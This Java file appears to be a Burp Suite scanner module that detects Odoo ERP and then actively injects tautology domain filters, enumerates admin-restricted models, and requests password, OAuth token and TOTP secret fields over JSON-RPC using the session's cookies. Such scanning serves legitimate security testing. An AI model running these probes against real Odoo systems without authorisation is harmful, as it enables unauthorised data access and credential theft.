package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.google.gson.*;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: Odoo ERP Domain Filter Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on Odoo ERP indicators in responses. Only when
 * Odoo is confirmed does it fire domain filter injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body, URL, and headers for Odoo indicators
 *   3. If NO Odoo indicators -> returns empty (zero payloads sent)
 *   4. If Odoo detected -> reports INFO finding, then injects domain filter payloads
 *   5. Builds JSON-RPC requests from scratch for model enumeration and field probing
 *
 * All methods are READ-ONLY (search_read, fields_get, search_count — no create/write/unlink).
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class OdooDomainScanner implements ScanModule {

    private static final String MODULE_ID = "odoo-domain-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // -- Odoo detection patterns (passive gate) --------------------------------

    // Error messages that confirm Odoo — only Odoo-exclusive patterns (no generic Python/PostgreSQL)
    private static final Pattern ODOO_ERROR_PATTERN = Pattern.compile(
            "odoo\\.exceptions\\.\\w+|openerp\\.exceptions|"
                    + "odoo\\.tools\\.|odoo\\.models\\.|odoo\\.api\\.|"
                    + "odoo\\.fields\\.|odoo\\.osv\\.|openerp\\.osv|"
                    + "odoo\\.addons\\.\\w+",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate Odoo endpoints
    // Removed: /jsonrpc (too generic — any JSON-RPC 2.0 service matches)
    private static final Pattern ODOO_URL_PATTERN = Pattern.compile(
            "/web/dataset/|/xmlrpc/2/|"
                    + "/web/session/authenticate|/web/session/get_session_info|"
                    + "/web/action/load|/web/webclient/version_info",
            Pattern.CASE_INSENSITIVE);

    // -- Phase 2: Sensitive models to probe ------------------------------------

    // Only admin-restricted models — removed user-accessible models that produce FP:
    // res.users, res.groups, mail.message, res.partner, ir.module.module, res.company (all readable by default)
    private static final String[] SENSITIVE_MODELS = {
            "ir.config_parameter", "ir.model.access", "ir.cron", "ir.rule",
            "fetchmail.server", "ir.mail_server", "res.config.settings"
    };

    // -- Phase 3: Sensitive fields to probe ------------------------------------

    // Only truly sensitive fields — removed login/email/signature (standard readable fields on res.users)
    private static final String[] SENSITIVE_FIELDS = {
            "password", "password_crypt", "oauth_access_token", "totp_secret"
    };

    private static final Set<String> SENSITIVE_FIELD_SET = Set.of(SENSITIVE_FIELDS);

    // -- Gson instance ---------------------------------------------------------

    private static final Gson GSON = new Gson();

    // -- ScanModule interface --------------------------------------------------

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "Odoo Domain Filter Injection"; }
    @Override public String getDescription() {
        return "Detects Odoo ERP instances and tests for domain filter injection, "
                + "model enumeration, field exposure, and method call probing. "
                + "Only activates when Odoo indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used -- no OOB needed for Odoo domain injection
    }

    @Override public void destroy() {}

    // -- Main entry point ------------------------------------------------------

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for Odoo indicators
        OdooDetection detection = detectOdoo(requestResponse);
        if (detection == null) return Collections.emptyList();

        // Odoo confirmed -- report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "odoo-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Odoo ERP Instance Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running Odoo ERP. "
                            + "Domain filter injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[Odoo] Odoo ERP detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject domain filter payloads
        try {
            testOdooInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // -- Odoo Detection (passive gate) -----------------------------------------

    private OdooDetection detectOdoo(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal -- standalone)
        if (ODOO_ERROR_PATTERN.matcher(body).find()) {
            return new OdooDetection("Odoo error pattern in response body");
        }

        // Check 2: URL pattern + JSON-RPC body format (require both — URL alone or werkzeug alone insufficient)
        if (ODOO_URL_PATTERN.matcher(url).find()) {
            // Require JSON-RPC response format as secondary signal
            if (body.contains("\"jsonrpc\"")
                    && (body.contains("\"result\"") || body.contains("\"error\""))) {
                // Additionally verify with a third signal: werkzeug header OR Odoo-specific body content
                boolean hasWerkzeug = false;
                for (var h : reqResp.response().headers()) {
                    if (h.name().equalsIgnoreCase("Server")
                            && h.value().toLowerCase().contains("werkzeug")) {
                        hasWerkzeug = true;
                        break;
                    }
                }
                // Require Odoo-specific body marker (not just werkzeug — Flask also uses werkzeug)
                // Removed: session_id (too generic), server_version (borderline)
                // Require Odoo module-path markers (use "odoo." with dot to avoid bare word match)
                boolean hasOdooBodyMarker = body.contains("odoo.") || body.contains("web.assets")
                        || body.contains("ir.actions") || body.contains("res.users");
                if (hasOdooBodyMarker) {
                    return new OdooDetection(
                            "Odoo URL pattern (" + url + ") + JSON-RPC body + "
                                    + (hasWerkzeug ? "Werkzeug header" : "Odoo body marker"));
                }
            }
        }

        return null; // No Odoo detected -- module stays dormant
    }

    // -- Active Odoo Injection Testing -----------------------------------------

    private void testOdooInjection(HttpRequestResponse original, OdooDetection detection,
                                    String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Phase 1: Domain Filter Injection (tautology)
        testDomainFilterInjection(original, url, urlPath);

        // Phase 2: Model Enumeration
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        testModelEnumeration(original, url, urlPath);

        // Phase 3: Field Exposure
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        testFieldExposure(original, url, urlPath);

        // Phase 4: Method Call Probing (fields_get)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        testFieldsGetProbing(original, url, urlPath);
    }

    // -- Phase 1: Domain Filter Injection (tautology) --------------------------

    private void testDomainFilterInjection(HttpRequestResponse original, String url,
                                            String urlPath) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, urlPath, "domain-injection")) return;

        // Parse the original request body as JSON-RPC
        String requestBody = original.request().bodyToString();
        if (requestBody == null || requestBody.isEmpty()) return;

        JsonObject jsonBody;
        try {
            jsonBody = JsonParser.parseString(requestBody).getAsJsonObject();
        } catch (Exception e) {
            return; // Not valid JSON
        }

        // Find the domain parameter in JSON-RPC body
        JsonArray originalDomain = findDomain(jsonBody);
        if (originalDomain == null || originalDomain.size() == 0) return;

        // Baseline: count record IDs in original response (exclude JSON-RPC envelope "id")
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        // Count "id": in records but subtract 1 for JSON-RPC envelope "id" field
        int baselineRows = Math.max(0, countOccurrences(baselineBody, "\"id\":") - 1);

        // Build tautology domain using Odoo's Polish-notation OR operator.
        // For N original leaf clauses, we need N "|" operators to fully OR the tautology with all clauses.
        // This produces: ["|", "|", ..., ["id", ">", 0], clause1, clause2, ...]
        // which evaluates as: (tautology OR clause1 OR clause2 OR ...) = always true
        JsonArray injectedDomain = new JsonArray();
        // Count leaf clauses and operators in original domain to determine top-level expression count.
        // In Odoo Polish notation: top-level expressions = leaves - binary operators.
        // We need that many "|" operators to OR the tautology with all top-level expressions.
        int leafCount = 0;
        int operatorCount = 0;
        for (JsonElement elem : originalDomain) {
            if (elem.isJsonArray()) {
                leafCount++;
            } else if (elem.isJsonPrimitive()) {
                String val = elem.getAsString();
                if ("|".equals(val) || "&".equals(val) || "!".equals(val)) {
                    operatorCount++;
                }
            }
        }
        int topLevelExpressions = Math.max(1, leafCount - operatorCount);
        // Add one "|" for each top-level expression in the original domain
        for (int i = 0; i < topLevelExpressions; i++) {
            injectedDomain.add("|");
        }
        JsonArray tautologyTuple = new JsonArray();
        tautologyTuple.add("id");
        tautologyTuple.add(">");
        tautologyTuple.add(0);
        injectedDomain.add(tautologyTuple);
        // Append all original domain elements (both operators and leaf clauses)
        for (JsonElement elem : originalDomain) {
            injectedDomain.add(elem);
        }

        // Inject the tautology domain into the JSON-RPC body
        JsonObject modifiedBody = jsonBody.deepCopy();
        if (!replaceDomain(modifiedBody, injectedDomain)) return;

        String modifiedJson = GSON.toJson(modifiedBody);
        HttpRequestResponse result = sendJsonRpcRequest(original.request(), modifiedJson);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";
        int resultRows = Math.max(0, countOccurrences(resultBody, "\"id\":") - 1);

        if (resultRows > baselineRows + 2 && result.response().statusCode() == 200
                && !resultBody.equals(baselineBody)) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Odoo Domain Filter Injection -- Tautology Bypass",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter("domain (JSON-RPC body)")
                    .evidence("Injected tautology domain [\"|\", [\"id\", \">\", 0], ...] returned "
                            + resultRows + " rows vs baseline " + baselineRows + " rows. "
                            + "Domain filter was bypassed.")
                    .payload(GSON.toJson(injectedDomain))
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // -- Phase 2: Model Enumeration --------------------------------------------

    private void testModelEnumeration(HttpRequestResponse original, String url,
                                       String urlPath) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, urlPath, "model-enum")) return;

        // Differential probe: two different models must produce different responses
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse resultA = sendSearchRead(original.request(), "res.users",
                new String[]{"id", "login"}, 5);
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse resultB = sendSearchRead(original.request(), "ir.cron",
                new String[]{"id", "name"}, 5);
        perHostDelay();

        if (resultA == null || resultA.response() == null
                || resultB == null || resultB.response() == null) return;

        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, model access is not injectable
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[Odoo] Model enumeration: differential probe failed -- "
                    + "two different models returned identical responses. Skipping.");
            return;
        }

        for (String model : SENSITIVE_MODELS) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            HttpRequestResponse result = sendSearchRead(original.request(), model,
                    new String[]{"id"}, 5);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            int status = result.response().statusCode();
            if (status >= 400 && status < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require JSON-RPC success with actual data (not empty result)
            // Odoo returns "result": [] or "result": false for access-denied — must reject those
            if (status == 200 && body.length() > 50
                    && body.contains("\"jsonrpc\"")
                    && body.contains("\"result\"")
                    && !body.contains("\"error\"")
                    && !body.contains("\"result\": []")
                    && !body.contains("\"result\":[]")
                    && !body.contains("\"result\": false")
                    && !body.contains("\"result\":false")
                    && !body.contains("\"result\": null")
                    && !body.contains("\"result\":null")) {

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Odoo Sensitive Model Accessible -- " + model,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter("model (JSON-RPC body)")
                        .evidence("search_read query against model '" + model + "' returned data. "
                                + "Differential probe confirmed model access influences query results. "
                                + "Response length: " + body.length() + " bytes.")
                        .payload("search_read on " + model)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // -- Phase 3: Field Exposure -----------------------------------------------

    private void testFieldExposure(HttpRequestResponse original, String url,
                                    String urlPath) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, urlPath, "field-exposure")) return;

        // Baseline: search_read on res.users with minimal fields
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse baselineResult = sendSearchRead(original.request(), "res.users",
                new String[]{"id", "name"}, 5);
        perHostDelay();
        if (baselineResult == null || baselineResult.response() == null) return;

        String baselineBody = baselineResult.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        Set<String> baselineKeys = extractJsonKeys(baselineBody);

        // Expand fields to include sensitive fields
        String[] expandedFields = new String[]{
                "id", "name", "password", "password_crypt",
                "oauth_access_token", "totp_secret"
        };

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse result = sendSearchRead(original.request(), "res.users",
                expandedFields, 5);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: new JSON keys appeared that match our SENSITIVE_FIELDS list
        Set<String> resultKeys = extractJsonKeys(resultBody);
        Set<String> newKeys = new HashSet<>(resultKeys);
        newKeys.removeAll(baselineKeys);

        // Filter to only count keys that match the sensitive fields we requested
        Set<String> newSensitiveKeys = new HashSet<>();
        for (String key : newKeys) {
            if (SENSITIVE_FIELD_SET.contains(key)) {
                newSensitiveKeys.add(key);
            }
        }

        if (newSensitiveKeys.size() >= 2 && result.response().statusCode() == 200) {
            // Filter out fields whose values are false/null/empty/"***" -- Odoo's ORM
            // returns these placeholders when field-level ACLs block the real value.
            // Only fields with actual leaked data count as true exposure.
            Set<String> exposedWithData = new HashSet<>();
            for (String field : newSensitiveKeys) {
                if (hasNonTrivialValue(resultBody, field)) {
                    exposedWithData.add(field);
                }
            }

            if (exposedWithData.isEmpty()) {
                // All sensitive field values were false/null/empty -- no real data leaked.
                // Report as INFO since the server acknowledged the fields exist but
                // correctly blocked the values. This is schema-level metadata only,
                // similar to what fields_get reveals (Phase 4).
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Odoo Sensitive Fields Returned as Empty/False -- res.users",
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(url).parameter("fields (JSON-RPC body)")
                        .evidence("search_read with sensitive field names returned "
                                + newSensitiveKeys.size() + " sensitive keys in the response: "
                                + newSensitiveKeys + ", but all values were false/null/empty. "
                                + "The ORM blocked the actual values (field-level ACLs working). "
                                + "No real data was exposed.")
                        .payload("fields: " + Arrays.toString(expandedFields))
                        .requestResponse(result)
                        .build());
            } else {
                // At least some fields have real data -- true exposure
                boolean hasPassword = false;
                for (String pwField : new String[]{"password", "password_crypt"}) {
                    if (exposedWithData.contains(pwField)) {
                        hasPassword = true;
                        break;
                    }
                }
                Severity sev = hasPassword ? Severity.CRITICAL : Severity.HIGH;
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Odoo Field Exposure -- " + exposedWithData.size() + " Sensitive Fields",
                                sev, Confidence.FIRM)
                        .url(url).parameter("fields (JSON-RPC body)")
                        .evidence("Injected search_read with sensitive field names returned "
                                + exposedWithData.size() + " sensitive fields with actual data "
                                + "(not false/null/empty): " + exposedWithData
                                + ". Fields blocked by ACLs: "
                                + difference(newSensitiveKeys, exposedWithData))
                        .payload("fields: " + Arrays.toString(expandedFields))
                        .requestResponse(result)
                        .build());
            }
        }
        perHostDelay();
    }

    // -- Phase 4: Method Call Probing (fields_get) -----------------------------

    private void testFieldsGetProbing(HttpRequestResponse original, String url,
                                       String urlPath) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, urlPath, "fields-get")) return;

        // Differential probe: two models must return different schemas
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse resultA = sendFieldsGet(original.request(), "res.users");
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse resultB = sendFieldsGet(original.request(), "ir.config_parameter");
        perHostDelay();

        if (resultA == null || resultA.response() == null
                || resultB == null || resultB.response() == null) return;

        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, fields_get is not accessible
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[Odoo] fields_get probing: differential probe failed -- "
                    + "two different models returned identical schemas. Skipping.");
            return;
        }

        // Check res.users schema for sensitive field names
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        checkSchemaExposure(resultA, "res.users", bodyA, url);

        // Check ir.config_parameter schema for sensitive field names
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        checkSchemaExposure(resultB, "ir.config_parameter", bodyB, url);
    }

    /**
     * Check if a fields_get response exposes sensitive field names in the schema.
     */
    private void checkSchemaExposure(HttpRequestResponse result, String model,
                                      String body, String url) {
        int status = result.response().statusCode();
        if (status >= 400 && status < 500) return;
        if (!ResponseGuard.isUsableResponse(result)) return;

        if (status == 200 && body.length() > 50
                && body.contains("\"jsonrpc\"")
                && body.contains("\"result\"")
                && !body.contains("\"error\"")) {

            // Check only truly sensitive field names in schema (not login/email/signature which are standard)
            String[] schemaOnlySensitive = {"password", "password_crypt", "oauth_access_token", "totp_secret"};
            List<String> exposedFields = new ArrayList<>();
            for (String field : schemaOnlySensitive) {
                if (body.contains("\"" + field + "\"")) {
                    exposedFields.add(field);
                }
            }

            if (!exposedFields.isEmpty()) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Odoo Schema Exposure via fields_get -- " + model,
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(url).parameter("model (JSON-RPC body)")
                        .evidence("fields_get on model '" + model + "' exposed schema containing "
                                + exposedFields.size() + " sensitive field definitions: " + exposedFields
                                + ". Differential probe confirmed fields_get returns model-specific schemas.")
                        .payload("fields_get on " + model)
                        .requestResponse(result)
                        .build());
            }
        }
    }

    // -- JSON-RPC Request Building ---------------------------------------------

    /**
     * Build and send a JSON-RPC search_read request from scratch using the original
     * request's headers/cookies for authentication.
     */
    private HttpRequestResponse sendSearchRead(HttpRequest originalRequest, String model,
                                                String[] fields, int limit) {
        if (ScanState.isCancelled() || Thread.currentThread().isInterrupted()) return null;

        // Build the JSON-RPC body for search_read
        JsonObject rpcBody = new JsonObject();
        rpcBody.addProperty("jsonrpc", "2.0");
        rpcBody.addProperty("id", 1);
        rpcBody.addProperty("method", "call");

        JsonObject params = new JsonObject();
        params.addProperty("model", model);
        params.addProperty("method", "search_read");

        // args: [domain, fields, offset, limit]
        JsonArray args = new JsonArray();
        args.add(new JsonArray()); // empty domain = all records
        JsonArray fieldsArray = new JsonArray();
        for (String f : fields) fieldsArray.add(f);
        args.add(fieldsArray);
        args.add(0); // offset
        args.add(limit);
        params.add("args", args);

        // kwargs
        JsonObject kwargs = new JsonObject();
        params.add("kwargs", kwargs);

        rpcBody.add("params", params);

        String jsonBody = GSON.toJson(rpcBody);
        return sendJsonRpcFromScratch(originalRequest, "/web/dataset/call_kw", jsonBody);
    }

    /**
     * Build and send a JSON-RPC fields_get request from scratch.
     */
    private HttpRequestResponse sendFieldsGet(HttpRequest originalRequest, String model) {
        if (ScanState.isCancelled() || Thread.currentThread().isInterrupted()) return null;

        // Build the JSON-RPC body for fields_get via call_kw
        JsonObject rpcBody = new JsonObject();
        rpcBody.addProperty("jsonrpc", "2.0");
        rpcBody.addProperty("id", 2);
        rpcBody.addProperty("method", "call");

        JsonObject params = new JsonObject();
        params.addProperty("model", model);
        params.addProperty("method", "fields_get");

        // args: [] (no positional args)
        params.add("args", new JsonArray());

        // kwargs: empty
        JsonObject kwargs = new JsonObject();
        params.add("kwargs", kwargs);

        rpcBody.add("params", params);

        String jsonBody = GSON.toJson(rpcBody);
        return sendJsonRpcFromScratch(originalRequest, "/web/dataset/call_kw", jsonBody);
    }

    /**
     * Send a JSON-RPC request by replacing the body of the original request.
     * Used for Phase 1 where we modify the existing JSON-RPC body.
     */
    private HttpRequestResponse sendJsonRpcRequest(HttpRequest originalRequest, String jsonBody) {
        if (ScanState.isCancelled() || Thread.currentThread().isInterrupted()) return null;

        try {
            HttpRequest modified = originalRequest.withBody(jsonBody);
            // Update Content-Length header
            modified = modified
                    .withRemovedHeader("Content-Length")
                    .withAddedHeader("Content-Length",
                            String.valueOf(jsonBody.getBytes(StandardCharsets.UTF_8).length));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    /**
     * Build a JSON-RPC request from scratch using the original request's
     * headers/cookies for authentication. Used for Phase 2/3/4 probes.
     */
    private HttpRequestResponse sendJsonRpcFromScratch(HttpRequest originalRequest,
                                                        String path, String jsonBody) {
        if (ScanState.isCancelled() || Thread.currentThread().isInterrupted()) return null;

        try {
            StringBuilder headers = new StringBuilder();
            headers.append("POST ").append(path).append(" HTTP/1.1\r\n");
            headers.append("Host: ").append(originalRequest.httpService().host()).append("\r\n");
            headers.append("Content-Type: application/json\r\n");
            headers.append("Content-Length: ")
                    .append(jsonBody.getBytes(StandardCharsets.UTF_8).length)
                    .append("\r\n");

            // Carry over cookies and authorization from original request
            for (var h : originalRequest.headers()) {
                String name = h.name().toLowerCase();
                if (name.equals("cookie") || name.equals("authorization")
                        || name.equals("x-csrf-token") || name.equals("x-xsrf-token")) {
                    headers.append(h.name()).append(": ").append(h.value()).append("\r\n");
                }
            }

            headers.append("\r\n");
            headers.append(jsonBody);

            HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                    headers.toString());

            HttpRequestResponse result = api.http().sendRequest(req);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    // -- Domain Manipulation Helpers -------------------------------------------

    /**
     * Find the domain parameter in a JSON-RPC body.
     * Searches: params.domain, params.args (first array element that is an array),
     * params.kwargs.domain
     */
    private JsonArray findDomain(JsonObject jsonBody) {
        try {
            JsonObject params = jsonBody.getAsJsonObject("params");
            if (params == null) return null;

            // Check params.domain
            if (params.has("domain") && params.get("domain").isJsonArray()) {
                return params.getAsJsonArray("domain");
            }

            // Check params.args — find the first array-of-arrays element
            if (params.has("args") && params.get("args").isJsonArray()) {
                JsonArray args = params.getAsJsonArray("args");
                for (JsonElement arg : args) {
                    if (arg.isJsonArray()) {
                        JsonArray arr = arg.getAsJsonArray();
                        // Verify it looks like an Odoo domain (contains arrays or strings)
                        if (arr.size() > 0 && (arr.get(0).isJsonArray()
                                || (arr.get(0).isJsonPrimitive()
                                && (arr.get(0).getAsString().equals("|")
                                || arr.get(0).getAsString().equals("&")
                                || arr.get(0).getAsString().equals("!"))))) {
                            return arr;
                        }
                    }
                }
            }

            // Check params.kwargs.domain
            if (params.has("kwargs") && params.get("kwargs").isJsonObject()) {
                JsonObject kwargs = params.getAsJsonObject("kwargs");
                if (kwargs.has("domain") && kwargs.get("domain").isJsonArray()) {
                    return kwargs.getAsJsonArray("domain");
                }
            }
        } catch (Exception e) {
            // JSON parsing error — not an injectable body
        }
        return null;
    }

    /**
     * Replace the domain parameter in a JSON-RPC body with the injected domain.
     * Returns true if replacement was successful.
     */
    private boolean replaceDomain(JsonObject jsonBody, JsonArray injectedDomain) {
        try {
            JsonObject params = jsonBody.getAsJsonObject("params");
            if (params == null) return false;

            // Replace params.domain
            if (params.has("domain") && params.get("domain").isJsonArray()) {
                params.add("domain", injectedDomain);
                return true;
            }

            // Replace in params.args — find the first array-of-arrays element
            if (params.has("args") && params.get("args").isJsonArray()) {
                JsonArray args = params.getAsJsonArray("args");
                for (int i = 0; i < args.size(); i++) {
                    JsonElement arg = args.get(i);
                    if (arg.isJsonArray()) {
                        JsonArray arr = arg.getAsJsonArray();
                        if (arr.size() > 0 && (arr.get(0).isJsonArray()
                                || (arr.get(0).isJsonPrimitive()
                                && (arr.get(0).getAsString().equals("|")
                                || arr.get(0).getAsString().equals("&")
                                || arr.get(0).getAsString().equals("!"))))) {
                            args.set(i, injectedDomain);
                            return true;
                        }
                    }
                }
            }

            // Replace in params.kwargs.domain
            if (params.has("kwargs") && params.get("kwargs").isJsonObject()) {
                JsonObject kwargs = params.getAsJsonObject("kwargs");
                if (kwargs.has("domain") && kwargs.get("domain").isJsonArray()) {
                    kwargs.add("domain", injectedDomain);
                    return true;
                }
            }
        } catch (Exception e) {
            // JSON parsing error
        }
        return false;
    }

    // -- Field Value Checks ----------------------------------------------------

    /**
     * Check if a JSON field has a non-trivial value (i.e., actual data was leaked).
     * Returns false for: boolean false, null, empty string "", numeric 0,
     * all-asterisks "***" (redacted), and "********" patterns.
     *
     * Odoo's ORM returns false/null for fields blocked by ACLs, so the mere
     * presence of a key like "password" in the JSON response is NOT evidence of
     * data exposure -- the value must be checked.
     */
    private boolean hasNonTrivialValue(String body, String fieldName) {
        // Look for "fieldName": VALUE pattern and check the value
        String searchKey = "\"" + fieldName + "\"";
        int keyIdx = body.indexOf(searchKey);
        if (keyIdx < 0) return false;

        int colonIdx = body.indexOf(':', keyIdx + searchKey.length());
        if (colonIdx < 0) return false;

        // Skip whitespace after colon
        int valStart = colonIdx + 1;
        while (valStart < body.length() && body.charAt(valStart) == ' ') valStart++;
        if (valStart >= body.length()) return false;

        // Check for boolean false
        if (body.startsWith("false", valStart)) return false;

        // Check for null
        if (body.startsWith("null", valStart)) return false;

        // Check for numeric 0
        if (body.charAt(valStart) == '0'
                && (valStart + 1 >= body.length()
                    || !Character.isDigit(body.charAt(valStart + 1)))) return false;

        // Check for quoted value
        if (body.charAt(valStart) == '"') {
            int valEnd = body.indexOf('"', valStart + 1);
            if (valEnd < 0) return false;
            String value = body.substring(valStart + 1, valEnd);
            // Empty string
            if (value.isEmpty()) return false;
            // All asterisks (redacted)
            if (value.chars().allMatch(c -> c == '*')) return false;
            // Non-empty, non-redacted value -- real data
            return true;
        }

        // Check for empty array []
        if (body.charAt(valStart) == '[') {
            int nextNonSpace = valStart + 1;
            while (nextNonSpace < body.length() && body.charAt(nextNonSpace) == ' ') nextNonSpace++;
            if (nextNonSpace < body.length() && body.charAt(nextNonSpace) == ']') return false;
        }

        // If we reach here with a non-trivial JSON value (object, non-zero number, true, etc.)
        // consider it as containing data
        return true;
    }

    /**
     * Compute set difference: a minus b.
     */
    private Set<String> difference(Set<String> a, Set<String> b) {
        Set<String> result = new HashSet<>(a);
        result.removeAll(b);
        return result;
    }

    // -- Utility Methods -------------------------------------------------------

    /**
     * Extract all JSON keys from a response body.
     * Matches patterns like "key_name": in JSON.
     */
    private Set<String> extractJsonKeys(String body) {
        Set<String> keys = new HashSet<>();
        java.util.regex.Matcher m = Pattern.compile("\"([\\w.]+)\"\\s*:").matcher(body);
        while (m.find()) keys.add(m.group(1));
        return keys;
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("odoo.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    // -- Inner classes ---------------------------------------------------------

    private static class OdooDetection {
        final String evidence;
        OdooDetection(String evidence) {
            this.evidence = evidence;
        }
    }
}
